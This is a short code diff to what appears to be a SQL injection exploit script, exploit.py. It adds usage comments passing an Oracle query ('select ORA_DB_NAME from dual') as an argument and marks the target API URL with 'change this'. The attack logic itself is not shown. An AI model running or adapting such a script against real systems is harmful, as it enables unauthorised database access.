@@ -1,3 +1,6 @@
+# usage
+# python3 exploit.py "select ORA_DB_NAME from dual" 1
+
 import requests as req
 import sys
 
@@ -14,7 +17,7 @@ if __name__ == "__main__":
         print(f"Arg{arg_nr}: {sys.argv[arg_nr]}")
     print()
 
-    url="https://10.0.0.1/api/product/"
+    url="https://10.0.0.1/api/product/"            # change this
 
     headers = {}
     cookies = {}
